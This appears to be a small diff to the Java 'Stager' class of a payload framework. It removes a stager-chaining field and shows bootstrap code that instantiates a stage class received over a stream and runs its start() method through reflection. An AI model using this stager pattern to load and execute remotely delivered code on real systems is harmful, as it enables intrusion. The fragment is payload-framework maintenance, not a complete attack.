@@ -47,13 +47,7 @@ import java.security.cert.Certificate;
 
 public abstract class Stager extends ClassLoader {
 
-	public Stager targetStager = null;
-	
-	protected void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) throws Exception {
-		if (targetStager != null) {
-			targetStager.bootstrap(rawIn, out, parameters);
-			return;
-		}
+	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
 		try {
 			final DataInputStream in = new DataInputStream(rawIn);
 			Class clazz;
@@ -73,7 +67,7 @@ public abstract class Stager extends ClassLoader {
 			final Object stage = clazz.newInstance();
 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
 		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out));
+			t.printStackTrace(new PrintStream(out, true));
 		}
 	}
 
